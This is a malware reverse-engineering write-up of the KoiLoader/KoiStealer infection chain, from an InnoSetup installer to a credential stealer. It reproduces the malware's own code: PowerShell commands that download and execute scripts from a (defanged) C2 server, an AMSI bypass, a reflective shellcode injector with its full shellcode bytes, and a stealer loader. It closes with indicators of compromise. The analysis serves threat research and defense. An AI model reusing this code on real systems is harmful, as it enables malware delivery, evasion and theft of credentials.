---
title: KoiLoader/KoiStealer
by: dmpdump
tags: malware RE
---

On November 29,2024, MalwareHunterTeam posted the following sample in X:

[https://x.com/malwrhunterteam/status/1862624900592119903](https://x.com/malwrhunterteam/status/1862624900592119903)

* File name: mysetup.exe
* Hash: e29d2bd946212328bcdf783eb434e1b384445f4c466c5231f91a07a315484819
* Certificate: Zhengzhou Lichang Network Technology Co., Ltd.

The executable had minimal detection in VirusTotal, so it caught my attention.

![sshot](/assets/images/koiloader/lowvtdetection.png) 

The executable is an InnoSetup Installer. Upon unpacking the content and decompiling the Compiled.bin file, the following pseudo Pascal script code reveals a PowerShell downloader for a JS script named ‘vqPM0l4stR.js’.

```powershell
function INITIALIZESETUP(): BOOLEAN;
var
	v_1, v_6: Integer;
	v_2, v_3: BOOLEAN;
	v_4: Pointer;
	v_5: TEXECWAIT;
	v_7, v_8, v_9, v_10: UnicodeString;
begin
	label_531:
	result := WIZARDSILENT();
	v_2 := result;
	v_2 := not v_2;
	flag := not v_2;
	if flag then goto label_1166;
	label_583:
	v_4 := &v_1;
	v_5 := 0;
	v_6 := 0;
	v_7 := '';
	v_8 := '-command IWR -UseBasicParsing -Uri 'http://79.124.78[.]109/wp-includes/neocolonialXAW.php' -OutFile ($env:temp+'\vqPM0l4stR.js'); wscript ($env:temp+'\vqPM0l4stR.js');';
	v_10 := '{sysnative}\WindowsPowerShell\v1.0\powershell.exe';
	v_9 := EXPANDCONSTANT(v_10);
	v_3 := EXEC(v_9, v_8, v_7, v_6, v_5, {var}v_4);
	label_1166:
	exit;
end;

```

vqPM0l4stR.js performs the following actions:

* Creates an ActiveXObject shell object
* It uses WMI to validate the system architecture (32 bit/64 bit)
* Depending on the architecture, it sets the SysWOW64 (32 bit) or System32 (64 bit) folder to access PowerShell
* It reads the machine guid from the registry and creates a file named 'r' + MachineGUID + 'r'.js
* It checks if the current script is not called 'r' + MachineGUID + 'r'.js - if not, it copies itself to %programdata%
* It creates a mutex named "7zVBY5WWMUK1", and it checks if a file with that name exists in %temp%. It tries to delete the file, and if it does not exist, it downloads and executes two PowerShell scripts

```javascript
var f1 = "Scr", f2 = "ing.Fi", f3 = "stemOb" 
var fso = new ActiveXObject(f1 + "ipt" + f2 + "leSy" + f3 + "ject")
var w1 = "WSc", w2 = "riPt", w4 = "eLl" var wsh = w1 + w2 + ".sH" + w4 
var bbj = new ActiveXObject(wsh)
var fldr = GetObject("winmgmts:root\\cimv2:Win32_Processor='cpu0'").AddressWidth == 64 ? "SysWOW64" : "System32" 
var rd = bbj.ExpandEnvironmentStrings("%SYSTEMROOT%") + "\\" + fldr + "\\WindowsPowerShell\\v1.0\\powershell.exe" 
var agn = 'r' + bbj.RegRead('HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid') + 'r.js' 
if (WScript.ScriptName != agn) 
{
    var fs5 = "yFi" 
    try {
            fso["Cop" + fs5 + "le"](WScript.ScriptFullName, bbj.ExpandEnvironmentStrings("%programdata%") + "\\" + agn)
        } 
        catch (e) {}
}
var mtx_name = "7zVBY5WWMUK1" 
var mtx_file = bbj.ExpandEnvironmentStrings("%t" + "emp%") + "\\" + mtx_name 
var fs1 = "leteFi" 
var fs2 = "leExis" 
try {
    fso["De" + fs1 + "le"](mtx_file)
} 
catch (e) {}
if (!fso["Fi" + fs2 + "ts"](mtx_file)) {
    bbj.Run(rd + " -command \"$l1 = 'http://79.124.78[.]109/wp-includes/phyllopodan7V7GD.php'; $l2 = 'http://79.124.78[.]109/wp-includes/barasinghaby.ps1'; $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like '*siU*s') {$c=$b}}; $env:paths = '" + mtx_name + "'; IEX(Invoke-WebRequest -UseBasicParsing $l1); IEX(Invoke-WebRequest -UseBasicParsing $l2)\"", 0)
}
```
The first part of the PowerShell script retrieves AMSIUtils from the currenly loaded modules. It subsequently assigns that module to variable $c

```powershell
 $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like '*siU*s') {$c=$b}}
```
The downloaded phyllopodan7V7GD.php is then combined with the script to implement an AMSI bypass, setting amsiInitFailed to 'True'. This is a very old bypass technique created by Matt Graeber in 2016.

```powershell
$vl1 = ("BpurgB5kScMv4c06art5RWKJgSB28nf5lbr14c06art5RWKJqsaqYd2y0Ar14c06art5RWKJWvGhxE8INLDp4c06art5RWKJyn0TdLDEQQTh4c06art5RWKJ0EHxBKO1DmTq4c06art5RWKJPFsROw6TqJZu4c06art5RWKJQ3veKNHYjvzY" -match "4c06art5RWKJ"); #returns 'True'
$v2=$c.GetFields("NonPublic,Static");
Foreach($v3 in $v2) 
{if ($v3.Name -like "*am*ed") #looks for string that matches amsiInitFailed
{$v3.SetValue($null, $vl1)}}; # Sets amsiInitFailed to 'True'
```

After implementing the AMSI bypass, 'barasinghaby.ps1' is downloaded and executed. This script performs the following actions:

* It saves the downloaded guestwiseYtHA.exe into a byte array named $image
* It implements a function named GDT to 'Generate Delegate Types'
* It implements a function named GPA to 'Get Process Address' (equivalent to what the GetProcAddress API does, through reflection)
* It defines a $sc variable, which contains shellcode
* It injects the shellcode in memory via a combination of VirtualAlloc, CreateThread, and WaitForSingleObject

```powershell
[Byte[]]$image = (IWR -UseBasicParsing 'http://79.124.78[.]109/wp-includes/guestwiseYtHA.exe').Content;

function GDT
{
    Param
    (
        [OutputType([Type])]
            
        [Parameter( Position = 0)]
        [Type[]]
        $Parameters = (New-Object Type[](0)),
            
        [Parameter( Position = 1 )]
        [Type]
        $ReturnType = [Void]
    )

    $DA = New-Object System.Reflection.AssemblyName('RD')
    $AB = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DA, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $MB = $AB.DefineDynamicModule('IMM', $false)
    $TB = $MB.DefineType('MDT', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $CB = $TB.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
    $CB.SetImplementationFlags('Runtime, Managed')
    $MB = $TB.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
    $MB.SetImplementationFlags('Runtime, Managed')
        
    Write-Output $TB.CreateType()
}

function GPA
{
    Param
    (
        [OutputType([IntPtr])]
        
        [Parameter( Position = 0, Mandatory = $True )]
        [String]
        $Module,
            
        [Parameter( Position = 1, Mandatory = $True )]
        [String]
        $Procedure
    )

    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null)
    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
    $tmpPtr = New-Object IntPtr
    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
        
    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
}

$marshal = [System.Runtime.InteropServices.Marshal]

[Byte[]]$sc = 0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x14, 0x53, 0x56, 0x57, 0x64, 0xA1, 0x30, 0x00, 0x00, 0x00, 0x8B, 0x40, 0x0C, 0x8B, 0x40, 0x0C, 0x8B, 0x00, 0x8B, 0x00, 0x8B, 0x40, 0x18, 0x89, 0x45, 0xF8, 0x8B, 0x75, 0xF8, 0xBA, 0xF1, 0xF0, 0xAD, 0x0A, 0x8B, 0xCE, 0xE8, 0xD2, 0x01, 0x00, 0x00, 0xBA, 0x03, 0x1D, 0x3C, 0x0B, 0x89, 0x45, 0xF0, 0x8B, 0xCE, 0xE8, 0xC3, 0x01, 0x00, 0x00, 0xBA, 0xE3, 0xCA, 0xD8, 0x03, 0x89, 0x45, 0xEC, 0x8B, 0xCE, 0xE8, 0xB4, 0x01, 0x00, 0x00, 0x8B, 0xD8, 0x8B, 0x45, 0x08, 0x6A, 0x40, 0x68, 0x00, 0x30, 0x00, 0x00, 0x8B, 0x70, 0x3C, 0x03, 0xF0, 0x89, 0x75, 0xFC, 0xFF, 0x76, 0x50, 0xFF, 0x76, 0x34, 0xFF, 0xD3, 0x8B, 0xF8, 0x85, 0xFF, 0x75, 0x17, 0x6A, 0x40, 0x68, 0x00, 0x30, 0x00, 0x00, 0xFF, 0x76, 0x50, 0x50, 0xFF, 0xD3, 0x8B, 0xF8, 0x85, 0xFF, 0x0F, 0x84, 0x66, 0x01, 0x00, 0x00, 0x8B, 0x56, 0x54, 0x85, 0xD2, 0x74, 0x18, 0x8B, 0x75, 0x08, 0x8B, 0xCF, 0x2B, 0xF7, 0x8A, 0x04, 0x0E, 0x8D, 0x49, 0x01, 0x88, 0x41, 0xFF, 0x83, 0xEA, 0x01, 0x75, 0xF2, 0x8B, 0x75, 0xFC, 0x0F, 0xB7, 0x4E, 0x14, 0x33, 0xC0, 0x03, 0xCE, 0x33, 0xDB, 0x89, 0x4D, 0xF4, 0x66, 0x3B, 0x46, 0x06, 0x73, 0x44, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0xB7, 0xC3, 0x8D, 0x04, 0x80, 0x8B, 0x54, 0xC1, 0x28, 0x8B, 0x74, 0xC1, 0x2C, 0x8B, 0x4C, 0xC1, 0x24, 0x03, 0x75, 0x08, 0x03, 0xCF, 0x85, 0xD2, 0x74, 0x13, 0x2B, 0xF1, 0x0F, 0x1F, 0x00, 0x8A, 0x04, 0x0E, 0x8D, 0x49, 0x01, 0x88, 0x41, 0xFF, 0x83, 0xEA, 0x01, 0x75, 0xF2, 0x8B, 0x75, 0xFC, 0x43, 0x8B, 0x4D, 0xF4, 0x66, 0x3B, 0x5E, 0x06, 0x72, 0xC5, 0x8B, 0x86, 0x80, 0x00, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x76, 0x83, 0xBE, 0x84, 0x00, 0x00, 0x00, 0x14, 0x72, 0x6D, 0x83, 0x7C, 0x38, 0x0C, 0x00, 0x8D, 0x1C, 0x38, 0x89, 0x5D, 0x08, 0x74, 0x60, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0x8B, 0x43, 0x0C, 0x03, 0xC7, 0x50, 0xFF, 0x55, 0xF0, 0x8B, 0xD0, 0x89, 0x55, 0xF4, 0x85, 0xD2, 0x74, 0x3A, 0x8B, 0x73, 0x10, 0x8B, 0x0B, 0x85, 0xC9, 0x8D, 0x1C, 0x3E, 0x0F, 0x45, 0xF1, 0x03, 0xF7, 0x8B, 0x06, 0x85, 0xC0, 0x74, 0x22, 0x79, 0x05, 0x0F, 0xB7, 0xC0, 0xEB, 0x05, 0x83, 0xC0, 0x02, 0x03, 0xC7, 0x50, 0x52, 0xFF, 0x55, 0xEC, 0x8B, 0x55, 0xF4, 0x83, 0xC6, 0x04, 0x89, 0x03, 0x83, 0xC3, 0x04, 0x8B, 0x06, 0x85, 0xC0, 0x75, 0xDE, 0x8B, 0x5D, 0x08, 0x83, 0xC3, 0x14, 0x89, 0x5D, 0x08, 0x83, 0x7B, 0x0C, 0x00, 0x75, 0xA8, 0x8B, 0x75, 0xFC, 0x8B, 0xDF, 0x2B, 0x5E, 0x34, 0x83, 0xBE, 0xA4, 0x00, 0x00, 0x00, 0x00, 0x74, 0x52, 0x8B, 0x86, 0xA0, 0x00, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x48, 0x83, 0x3C, 0x38, 0x00, 0x8D, 0x14, 0x38, 0x74, 0x3F, 0x0F, 0x1F, 0x40, 0x00, 0x8B, 0x72, 0x04, 0x8D, 0x42, 0x04, 0x83, 0xEE, 0x08, 0x89, 0x45, 0x08, 0xD1, 0xEE, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x74, 0x1C, 0x0F, 0xB7, 0x44, 0x4A, 0x08, 0x66, 0x85, 0xC0, 0x74, 0x0A, 0x25, 0xFF, 0x0F, 0x00, 0x00, 0x03, 0x02, 0x01, 0x1C, 0x38, 0x41, 0x3B, 0xCE, 0x72, 0xE7, 0x8B, 0x45, 0x08, 0x03, 0x10, 0x83, 0x3A, 0x00, 0x75, 0xC8, 0x8B, 0x75, 0xFC, 0x64, 0xA1, 0x30, 0x00, 0x00, 0x00, 0x89, 0x78, 0x08, 0x8B, 0x46, 0x28, 0x03, 0xC7, 0xFF, 0xD0, 0x5F, 0x5E, 0x5B, 0x8B, 0xE5, 0x5D, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x14, 0x53, 0x8B, 0xD9, 0x89, 0x55, 0xF8, 0x56, 0x57, 0x33, 0xFF, 0x8B, 0x43, 0x3C, 0x8B, 0x44, 0x18, 0x78, 0x03, 0xC3, 0x8B, 0x48, 0x1C, 0x8B, 0x50, 0x24, 0x03, 0xCB, 0x03, 0xD3, 0x89, 0x4D, 0xEC, 0x8B, 0x48, 0x20, 0x03, 0xCB, 0x89, 0x55, 0xF0, 0x8B, 0x50, 0x18, 0x89, 0x4D, 0xF4, 0x89, 0x55, 0xFC, 0x85, 0xD2, 0x74, 0x4B, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0x8B, 0x34, 0xB9, 0x03, 0xF3, 0x74, 0x3A, 0x8A, 0x0E, 0x33, 0xC0, 0x84, 0xC9, 0x74, 0x2A, 0x90, 0xC1, 0xE0, 0x04, 0x8D, 0x76, 0x01, 0x0F, 0xBE, 0xC9, 0x03, 0xC1, 0x8B, 0xD0, 0x81, 0xE2, 0x00, 0x00, 0x00, 0xF0, 0x74, 0x07, 0x8B, 0xCA, 0xC1, 0xE9, 0x18, 0x33, 0xC1, 0x8A, 0x0E, 0xF7, 0xD2, 0x23, 0xC2, 0x84, 0xC9, 0x75, 0xDA, 0x8B, 0x55, 0xFC, 0x3B, 0x45, 0xF8, 0x74, 0x11, 0x8B, 0x4D, 0xF4, 0x47, 0x3B, 0xFA, 0x72, 0xBA, 0x5F, 0x5E, 0x33, 0xC0, 0x5B, 0x8B, 0xE5, 0x5D, 0xC3, 0x8B, 0x45, 0xF0, 0x8B, 0x4D, 0xEC, 0x0F, 0xB7, 0x04, 0x78, 0x5F, 0x5E, 0x8B, 0x04, 0x81, 0x03, 0xC3, 0x5B, 0x8B, 0xE5, 0x5D, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC

$VAAddr = GPA kernel32.dll VirtualAlloc
$VADeleg = GDT @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
$VA = $marshal::GetDelegateForFunctionPointer($VAAddr, $VADeleg)
$CTAddr = GPA kernel32.dll CreateThread
$CTDeleg = GDT @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
$CT = $marshal::GetDelegateForFunctionPointer($CTAddr, $CTDeleg)
$WFSOAddr = GPA kernel32.dll WaitForSingleObject
$WFSODeleg = GDT @([IntPtr], [Int32]) ([Int])
$WFSO = $marshal::GetDelegateForFunctionPointer($WFSOAddr, $WFSODeleg)

$x=$VA.Invoke(0,$sc.Length, 0x3000, 0x40)
$marshal::Copy($sc, 0, $x, $sc.Length);

$imageBuf = $marshal::AllocHGlobal($image.Length)
$marshal::Copy($image, 0, $imageBuf, $image.Length);

$thread = $CT.Invoke([int]$false, [int]$false, $x, $imageBuf, 0, 0);
$WFSO.Invoke($thread, -1);

```
Of interest, marshall::copy in C# has a different order of arguments than memcpy:

marshall::copy
`Marshal.Copy(source, startIndex, destination, length)`

memcpy
`void *memcpy(void *destination, const void *source, size_t num)`

The shellcode receives the buffer with the payload as an argument (to load it). 
Function prototype of CreateThread, for reference:

```c
HANDLE CreateThread(
  [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
  [in]            SIZE_T                  dwStackSize,
  [in]            LPTHREAD_START_ROUTINE  lpStartAddress,
  [in, optional]  __drv_aliasesMem LPVOID lpParameter,
  [in]            DWORD                   dwCreationFlags,
  [out, optional] LPDWORD                 lpThreadId
);
```

# Shellcode Analysis

The shellcode resolves APIs dynamically by first resolving the address of the PEB and then applying a hashing algorithm to resolve the APIs by hash.

![sshot](/assets/images/koiloader/sc1.png) 

The following Python script reproduces the algorithm used for API hashing:

```python
def custom_hash(string):
    if isinstance(string, str):
        string = string.encode('utf-8')
    
    hash_value = 0
    prev_hash = 0
    
    for char in string:
        intermediate = char + 16 * prev_hash
        high_bits = intermediate & 0xF0000000
        if high_bits:
            intermediate ^= (high_bits >> 24) & 0xFF
        
        prev_hash = ~high_bits & intermediate
    
    return prev_hash

def test_hash(): 
    test_names = ["VirtualAlloc", "LoadLibraryA", "GetProcAddress"]

    for name in test_names:
        print(f"Hash for '{name}': {hex(custom_hash(name))}")

test_hash()
```
# guestwiseYtHA.exe

After some junk functions, the main function of guestwiseYtHA.exe obtains a encrypted shellcode from a resource, an XOR key from another resource, and decryptes/loads the shellcode in memory.
![sshot](/assets/images/koiloader/winmain_guest.png) 

Resource 54518 contains the encrypted shellcode, and resource 39596 contains the XOR key

![sshot](/assets/images/koiloader/res1.png)

![sshot](/assets/images/koiloader/res2.png)

The shellcode decryption function uses the same API hashing algorithm as the previous shellcode
![sshot](/assets/images/koiloader/scdecrypt.png)

The encrypted KoiLoader is decrypted with the following steps:
* The executable halves Resource 54518
* It grabs every second byte of the first half of the resource
* It decrypts those bytes with the XOR key

The resource decryption can be replicated with the following script:
```python
key = bytes.fromhex('8991936CB50F51CC012468C0BD6C59D313FB36DE489407DD3F')
with open('encdata.bin', 'rb') as f:
    raw_data = f.read()

size_enc_data = len(raw_data) // 2
processed_data = bytearray(raw_data[i * 2] for i in range(size_enc_data))

decrypted = bytearray()
for i in range(len(processed_data)):
    decrypted.append(processed_data[i] ^ key[i % len(key)])

with open('decrypted.bin', 'wb') as f:
    f.write(decrypted)
```
# KoiLoader
The decrypted executable is KoiLoader. The main function starts with a language check to avoid executing on a machine with a language from a Commonwealth of Independent States (CIS) country, followed by the core functionality of the loader

![sshot](/assets/images/koiloader/koiloadermainfuncs.png)

The virtualization checks include basic things such as:
* Enumerating display devices to determine if it is running in a virtualized environment (Hyper-V, Parallels Display Adapter, or Red Hat QXL controller)
* It disables file system redirection to access the native System32 folder and checks for the presence of VBoxService.exe or VBoxService.exe, indicative of VirtualBox
* It then proceeds to check for the presence of specific files, and validates some of the content (e.g. searches for the "BAIT" string). These are likely sandbox indicators
* It finally performs basic checks to identify sandboxes based on default user names, computer names, memory, and the presence of specific file patters
![sshot](/assets/images/koiloader/basicsandboxcheck.png)

The anti-analysis checks are followed by functions that implement the core functionality of the malware:
* Mutex creation and initialization of objects and structures
* Persistence (with a UAC bypass and Windows Defender evasion)
* A first POST request to the Command and Control (C2)
* A second request to the C2
* Download and execution of an infostealer
* A function to process commands from the C2

The first function creates a mutex computed based on the drive volume. If the mutex exists, it exits. Additionally, it initializes the Winsock DLL, a cryptographic provider, and the COM library
![sshot](/assets/images/koiloader/mutex_initialize.png)

The next function implements persistence via wscript.exe for the same script dropped via vqPM0l4stR.js (the first JavaScript script of the infection chain). The persistence is established through a Scheduled Task with information impersonating Mozilla Firefox. The Scheduled Taks is created via ITaskService COM interface, avoiding spawning a suspicious schtasks.exe. Additionally, the function checks if it's running as Administrator via NetUserGetInfo(). If it is, it attempts to exclude C:\ProgramData\ using a UAC Bypass via COM elevation moniker.

Overview of the function:
![sshot](/assets/images/koiloader/persist.png)

Scheduled Task:
![sshot](/assets/images/koiloader/schtask1.png)
![sshot](/assets/images/koiloader/schtask2.png)

The next function simply makes a first request to the C2. The first request uses the following format: "101|MachineGUID|YvWqbH7r|Random String", with 101 and YvWqbH7r being hard-coded values, possibly markers/identifiers.
![sshot](/assets/images/koiloader/firstpost.png)

The next function makes a second request to the C2, sending encoded system information. The exfiltrated information includes:
* The OS major version, minor version, and build number (obtained directly from the PEB)
* The domain, obtained by calling LsaOpenPolicy/LsaQueryInformationPolicy
* Computer name
* User name
![sshot](/assets/images/koiloader/post2.png)
![sshot](/assets/images/koiloader/post3.png)
![sshot](/assets/images/koiloader/post4.png)

The following function is responsible for downloading and executing the next-stage payload payload, a PowerShell script. In order to check which version of the payload to download (.NET 4 or .NET 2), the malware searches for csc.exe in .NET folders containing "v4.0.30319" and "v2.0.50727". Depending on where csc.exe is found, a specific version of the next-stage payload is downloaded (sd4.ps1 for .NET 4 and sd2.ps1 for .NET 2) from 79.124.78\[.\]109. The payload is subsequently executed via the combination of invoke-webrequest and invoke-expression.
![sshot](/assets/images/koiloader/download_next.png)

The next function implements a connection to the C2 in a loop, receiving and executing commands. The connection to the C2 implements a sleep function using a variable time based on a pseudo random number generated via a Mersenne Twister algorithm.

![sshot](/assets/images/koiloader/c2loop.png)
![sshot](/assets/images/koiloader/c2loop2.png)

If the malware receives the command `"INIT"`, it re-sends the first connection: `101|MachineGUID|YvWqbH7r|Random String`.

![sshot](/assets/images/koiloader/INIT.png)

The malware then implements a switch/case statement to receive commands from the C2. The following commands are present in this sample:

| Command |   Functionality   |
|---------|-------------------|
| 0x67    | Runs a command via "cmd.exe /c" |
| 0x68    | Execute an encoded PowerShell command |
| 0x69    | Adjusts Shutdown privileges and shuts down the system |
| 0x6A    | Creates Scheduled Task via a COM object |
| 0x6C    | Creates a new thread for a socket connection to C2 |
| 0x6E    | Injects processes (certutil, explorer, or temporary injector) |
| 0x70    | Dynamic loading of 'Release' function from a DLL |

<u>0x67 and 0x68</u><br />
These two commands allow for the execution of commands via either `cmd.exe` or via an encoded PowerShell script

![sshot](/assets/images/koiloader/com_67_68.png)

<u>0x69</u><br />
Command 0x69 is used to adjust privileges to SeShutDownPrivilege and then performs a system shutdown

![sshot](/assets/images/koiloader/shut1.png)

![sshot](/assets/images/koiloader/shut2.png)


<u>0x6A</u><br />
Command 0x61 creates a persistent Scheduled Task via a COM interface, as described previously. The task also impersonates Mozilla Firefox. 

![sshot](/assets/images/koiloader/com_6A.png)

<u>0x6C</u><br />
Command 0x6C creates a thread and subsequently initiates a socket connection to a C2 IP address. The thread subsequently spawns a new thread for a new connection.

![sshot](/assets/images/koiloader/com_6c2.png)

<u>0x6E</u><br />
Command 0x6E implements various injectors. One of the functions in the command obtains a handle to ntdll.dll and subsequently gets the NtUnmapViewOfSection function for a subsequent process hollowing injection. This function checks validates the Windows Subsystem. If the application is running as a console application, it injects certutil.exe. If it is running as a Windows GUI application, it injects explorer.exe.

![sshot](/assets/images/koiloader/com_6e1.png)

It then implements basic process hollowing injection:

![sshot](/assets/images/koiloader/com_6e2.png)

This command has an additional injector function that uses a temporary file. This function creates an executable with a random name (based on the Mersenne Twister PRGN algorithm) in the temporary folder. This temporary folder is then used for the injection.

![sshot](/assets/images/koiloader/cmd_6e3.png)
![sshot](/assets/images/koiloader/cmd_6e4.png)

<u>0x70</u><br />
The last command, 0x70, dynamically loads a DLL in memory, calling a hard-coded function named 'Release'

![sshot](/assets/images/koiloader/cmd_70.png)

# Download and Execution of the Stealer
sd4.ps1 and sd2.ps1 (described before) are two versions of the same PowerShell script used to run the stealer payload. These scripts perform the following actions:

* It initializes a byte array with an encrypted payload
* It makes a request to the C2, sending the Machine GUID and a secondary ID
* It retrieves an XOR key, which is subsequently used to XOR decrypt the encrypted byte array
* It reflectively loads the decrypted payload
* It calls the Invoke method on the entry point of the decrypted payload, using an array of strings as parameters. These parameters include the last 2 tokenized strings downloaded from the C2 (screenshot below)

```powershell
[byte[]] $bindata = 0x09, 0x12, 0xd9, 0x38, 0x30, 0x6c, 0x33, 0x6b, 0x31, 0x6c, 0x48, 0x49, 0xb7, 0xae, 0x79, 0x61, 0x88, 0x6b, 0x4e, 0x75, 0x44, 0x48, 0x49, 0x38, 0x73, 0x6c, 0x33, 0x6b, 0x35, 0x6c, 0x48, 
#redacted for brevity, complete blob here: https://gist.github.com/dmpdump/585978dee25a63dde0a37cd31323b17e

0x30, 0x6b, 0x4e, 0x75, 0x44, 0x48, 0x49, 0x38, 0x33, 0x6c, 0x33, 0x6b, 0x35, 0x6c, 0x48,0x49, 0x48, 0x51, 0x79, 0x61, 0x30, 0x6b, 0x4e, 0x75, 0x44, 0x48, 0x49, 0x38, 0x33,
0x6c, 0x33, 0x6b, 0x35, 0x6c, 0x48, 0x49, 0x48, 0x51, 0x79, 0x61, 0x30, 0x6b, 0x4e, 0x75

# [Net.ServicePointManager]::SecurityProtocol +='tls12'
$guid = (Get-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Cryptography).MachineGuid
$cfb = (new-object net.webclient).downloadstring("http://79.124.78[.]109/index.php?id=$guid&subid=zweyWGzf").Split('|')
$k = $cfb[0];

for ($i = 0; $i -lt $bindata.Length ; ++$i)
{
	$bindata[$i] = $bindata[$i] -bxor $k[$i % $k.Length]
}

$bf = [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static
$typee = [System.Type]::GetType("System.Reflection.Assembly")
$mtd = $typee.GetMethod("Load", [Type[]]@([byte[]]))

$sm = $mtd.Invoke($null, @(,$bindata))
$ep = $sm.EntryPoint


$ep.Invoke($null, (, [string[]] ($cfb[1], $cfb[2], $cfb[3])))
```
The response from the C2 is once again tokenized with pipes, using DHI83l3k5lHIHQya0kNu as the decryption key.

![sshot](/assets/images/koiloader/c2response.png)

The stealer performs the same anti-analysis checks as the loader, including a check for CIS countries (based on language) and known sandbox artifacts. 

![sshot](/assets/images/koiloader/stealcountry.png)
![sshot](/assets/images/koiloader/antianal.png)
![sshot](/assets/images/koiloader/strajnica.png)

It then likely sends the configuration from the C2 (which is passed as an argument) concatenating the Machine GUID with the 'GETCFG' string. 

![sshot](/assets/images/koiloader/getcfg.png)

Other stealing capabilities based on a quick triage of the stealer included browser data, sensitive application data, sticky notes, SSH keys.

![sshot](/assets/images/koiloader/browser_profiles.png)

![sshot](/assets/images/koiloader/chrome.png)

![sshot](/assets/images/koiloader/authy.png)

![sshot](/assets/images/koiloader/Skype.png)

![sshot](/assets/images/koiloader/sticky.png)

![sshot](/assets/images/koiloader/ssh.png)

The stealer also has a secondary loader capability, but I did not get any additional payload during analysis.

# IOCs
Nullsoft installer: e29d2bd946212328bcdf783eb434e1b384445f4c466c5231f91a07a315484819
guestwiseYtHA.exe: 94bf4f12cb8929037f6ee10d424d5a7ef5f193147312e22866dce4e0d56c2143
KoiStealer: bf1d3681259f26cb407d43e78988a13e1ba9256bd5d300d2eb63f55d937abbfe
C2: 79.124.78\[.\]109

# Previous reports
[https://malpedia.caad.fkie.fraunhofer.de/details/win.koistealer](https://malpedia.caad.fkie.fraunhofer.de/details/win.koistealer)